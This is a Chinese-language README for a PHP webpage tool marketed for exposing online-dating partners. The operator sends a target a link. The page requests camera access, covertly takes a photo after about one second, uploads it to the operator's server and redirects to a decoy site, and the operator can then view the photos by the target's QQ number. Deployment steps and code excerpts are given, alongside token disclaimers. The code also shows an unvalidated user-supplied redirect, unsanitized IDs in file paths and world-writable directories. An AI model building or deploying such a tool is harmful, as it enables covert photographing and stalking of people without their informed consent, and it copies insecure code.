# 照妖镜 - 网恋照妖镜系统

## 项目简介

**照妖镜**是一个轻量级的在线拍照工具系统，通过浏览器调用用户摄像头拍摄照片，并将照片保存到服务器。用户可以通过生成的链接分享给他人，他人点击链接后会自动调用摄像头拍照，拍照后的图片可以通过输入对应的ID进行查看。

该项目主要用于**娱乐和学习交流目的**，具有简洁的界面和易于部署的特点。

## 核心功能

✅ **在线拍照** - 通过浏览器调用摄像头拍摄照片  
✅ **链接生成** - 为每个用户生成独特的拍照链接  
✅ **照片查看** - 通过ID查看已拍摄的照片  
✅ **照片管理** - 支持分页显示和清空照片  
✅ **响应式设计** - 支持PC和移动设备  
✅ **简洁界面** - 使用Bootstrap框架美化界面  

## 项目结构

```
照妖镜/
├── index.php           # 拍照页面（调用摄像头）
├── qbl.php             # 照片处理和保存
├── ck.php              # 照片查看和管理
├── sc.php              # 主页面和链接生成
├── img/                # 照片保存目录
├── css/                # 样式文件
│   ├── shop.css
│   ├── shop_style.css
│   └── style.css
├── js/                 # JavaScript文件
│   ├── jquery.min.js
│   ├── main.js
│   ├── index.js
│   ├── all.js
│   ├── Sitetime.js
│   └── Mouse.js
├── images/             # 图片资源
│   ├── ico_success.png
│   ├── luyuz.png
│   └── luzuz.jpg
└── favicon.ico         # 网站图标
```

## 技术栈

| 技术 | 说明 |
| :--- | :--- |
| **PHP** | 后端处理语言 |
| **HTML/CSS/JavaScript** | 前端页面和交互 |
| **jQuery** | JavaScript库 |
| **Bootstrap** | 前端框架 |
| **WebRTC** | 浏览器摄像头调用 |

## 部署指南

### 环境要求

- **PHP 5.6+** 或更高版本
- **Web服务器**（Apache、Nginx等）
- **HTTPS** 支持（某些浏览器要求HTTPS才能调用摄像头）
- **现代浏览器**（Chrome、Firefox、Safari等）

### 安装步骤

#### 步骤1：上传文件

将项目文件上传到您的Web服务器根目录或子目录：

```bash
# 通过FTP或其他方式上传所有文件到服务器
# 例如上传到 /var/www/html/zhaoyaojing/
```

#### 步骤2：设置目录权限

确保 `img/` 目录可写：

```bash
# 创建img目录（如果不存在）
mkdir img

# 设置目录权限
chmod 777 img
```

#### 步骤3：配置域名（可选）

编辑 `sc.php` 文件，修改第73行的域名为您的实际域名：

```php
// 原代码
kd.href = 'https://www.youxuanma.cn/?id='+myid.value+'&url='+url.value;

// 修改为您的域名
kd.href = 'https://您的域名/?id='+myid.value+'&url='+url.value;
```

#### 步骤4：配置HTTPS（重要）

由于浏览器安全限制，调用摄像头**必须使用HTTPS**。请确保：

1. 您的服务器配置了SSL证书
2. 所有资源都通过HTTPS加载
3. 更新 `sc.php` 中的外部资源链接为HTTPS

#### 步骤5：访问应用

在浏览器中访问：

```
https://您的域名/sc.php
```

或者如果上传到子目录：

```
https://您的域名/zhaoyaojing/sc.php
```

## 使用说明

### 用户使用流程

1. **访问主页** - 打开 `sc.php` 页面

2. **生成链接**
   - 在"链接生成"标签页中
   - 输入对方的QQ号（或任意ID）
   - 输入拍照后跳转的URL（默认为 http://qq.com）
   - 点击"生成链接"按钮
   - 复制生成的链接

3. **分享链接** - 将链接发送给对方

4. **对方拍照**
   - 对方点击链接
   - 浏览器请求摄像头权限
   - 对方允许后自动拍照
   - 拍照完成后跳转到指定URL

5. **查看照片**
   - 返回主页
   - 在"链接生成"标签页中输入对方的ID
   - 点击"查看照片"按钮
   - 查看已拍摄的照片

### 照片管理

在 `ck.php` 页面可以：
- **查看照片** - 分页显示已拍摄的照片
- **清空照片** - 删除某个ID下的所有照片
- **分页浏览** - 每页显示3张照片，支持首页、上一页、下一页、末页导航

## 核心代码解析

### 1. 拍照页面（index.php）

```php
// 调用浏览器摄像头
navigator.mediaDevices.getUserMedia({ video: true })
  .then(function(stream) {
    video.srcObject = stream;
    video.play();
    
    // 1秒后拍照
    setTimeout(function(){
      context.drawImage(video, 0, 0, 480, 640);
    }, 1000);
    
    // 1.3秒后提交
    setTimeout(function(){
      var img = canvas.toDataURL('image/png');
      document.getElementById('result').value = img;
      document.getElementById('gopo').submit();
    }, 1300);
  });
```

**工作流程：**
- 使用 `getUserMedia` API 获取摄像头权限
- 将摄像头视频流显示在 `<video>` 元素上
- 使用 `canvas` 绘制视频帧
- 将图像转换为 Base64 编码
- 提交给 `qbl.php` 处理

### 2. 照片保存（qbl.php）

```php
// 验证参数
if(empty($id) || empty($url) || empty($base64_img)){    
    exit;
}

// 检查并创建目录
if(!file_exists($up_dir)){
  mkdir($up_dir, 0777);
}

// 验证图片格式
if(preg_match('/^(data:\s*image\/(\w+);base64,)/', $base64_img, $result)){
  $type = $result[2];
  if(in_array($type, array('bmp','png'))){
    // 生成文件名：ID_时间.格式
    $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type;
    // 解码并保存
    file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img)));
    // 跳转
    header("Location: ".$url);
  }
}
```

**工作流程：**
- 接收 Base64 编码的图片数据
- 验证参数完整性
- 验证图片格式（仅允许 bmp 和 png）
- 解码 Base64 数据
- 以 `ID_时间.格式` 的形式保存到 `img/` 目录
- 重定向到指定URL

### 3. 照片查看（ck.php）

```php
// 扫描目录获取该ID的所有照片
$handle = opendir($path);
while (false !== ($file = readdir($handle))) {
   list($filesname, $ext) = explode(".", $file);
   if($ext == "png" and explode('_', $filesname)[0] == $id) {
      $array[] = $file;
   }
}

// 分页显示
for($j = $imgnums*$page; $j < ($imgnums*$page+$imgnums) && $j < $i; ++$j){
   echo '<div>';
   echo "<img src=".$path."/".$array[$j]."><br /><br />";
   echo '</div>';
}
```

**工作流程：**
- 扫描 `img/` 目录
- 筛选出与ID匹配的PNG文件
- 按时间倒序排列
- 分页显示（每页3张）
- 提供清空照片功能

## 安全建议

⚠️ **重要提示：**

1. **用途限制** - 本项目仅供学习和娱乐使用，**禁止用于非法目的**

2. **隐私保护** - 
   - 请在服务条款中明确说明照片用途
   - 定期清理过期照片（建议7天）
   - 不要存储敏感信息

3. **文件安全** -
   - 限制上传文件类型（仅允许 bmp 和 png）
   - 验证文件大小
   - 定期备份和清理

4. **访问控制** -
   - 使用HTTPS加密传输
   - 考虑添加IP白名单
   - 限制请求频率

5. **代码安全** -
   - 移除硬编码的域名检查代码
   - 添加输入验证和过滤
   - 使用参数化查询防止注入

## 常见问题

### Q1: 为什么无法调用摄像头？

**原因：** 浏览器安全限制或HTTPS配置问题

**解决方案：**
- 确保使用HTTPS协议
- 检查浏览器是否允许访问摄像头
- 在浏览器设置中允许该网站访问摄像头
- 尝试使用其他浏览器

### Q2: 照片无法保存？

**原因：** `img/` 目录权限不足

**解决方案：**
```bash
chmod 777 img
```

### Q3: iOS系统无法拍照？

**原因：** iOS要求使用Safari浏览器

**解决方案：**
- 使用Safari浏览器打开链接
- 或使用调用Safari内核的第三方APP

### Q4: 照片保存位置在哪里？

**答：** 照片保存在 `img/` 目录下，文件名格式为 `ID_时间.png`

例如：`123456_020415_30.png` 表示ID为123456，时间为02:04:15，第30秒拍摄的照片

### Q5: 如何删除照片？

**答：** 在查看照片页面点击"清空所有照片"按钮，或直接删除 `img/` 目录下的文件

## 配置说明

### ck.php 配置

| 参数 | 说明 | 默认值 |
| :--- | :--- | :--- |
| `$imgnums` | 每页显示的图片数 | 3 |
| `$path` | 图片保存目录 | img |

### qbl.php 配置

| 参数 | 说明 | 默认值 |
| :--- | :--- | :--- |
| `$up_dir` | 上传目录 | ./img/ |
| 允许格式 | 支持的图片格式 | bmp, png |

## 文件说明

| 文件 | 功能 |
| :--- | :--- |
| `index.php` | 拍照页面，调用摄像头并拍照 |
| `qbl.php` | 处理拍照数据，保存图片到服务器 |
| `ck.php` | 查看和管理已拍摄的照片 |
| `sc.php` | 主页面，生成拍照链接和导航 |
| `css/` | 样式文件目录 |
| `js/` | JavaScript脚本目录 |
| `images/` | 图片资源目录 |
| `img/` | 用户拍摄的照片保存目录 |

## 性能优化建议

1. **定期清理照片** - 设置定时任务删除7天前的照片
2. **压缩图片** - 减小图片文件大小
3. **CDN加速** - 使用CDN加速静态资源
4. **数据库优化** - 如需扩展，考虑使用数据库记录照片元数据

## 扩展功能建议

1. **用户认证** - 添加登录功能
2. **照片分享** - 支持分享到社交媒体
3. **美化滤镜** - 添加拍照前的滤镜效果
4. **实时预览** - 显示摄像头实时预览
5. **数据库** - 使用数据库记录照片信息
6. **API接口** - 提供RESTful API

## 许可证

本项目仅供学习和娱乐交流使用，使用者需自行承担使用本项目产生的一切后果。

## 免责声明

- 本工具仅做学习交流使用，请勿用于非法用途
- 如有侵权、肖像权等问题，请及时联系删除
- 本项目不对用户行为负责
- 使用本项目即视为同意以上条款

## 更新日志

### v1.0 (2021-04-29)
- ✅ 初始版本发布
- ✅ 实现基本的拍照功能
- ✅ 实现照片查看和管理
- ✅ 响应式设计

## 联系方式

如有问题或建议，请通过以下方式联系：
- 邮箱：[您的邮箱]
- QQ：[您的QQ]
- GitHub Issues：[项目地址]

---

**最后更新：** 2024年  
**版本：** 1.0  
**作者：** 优选源码库

**重要声明：本项目仅供学习交流使用，禁止用于任何非法目的！**
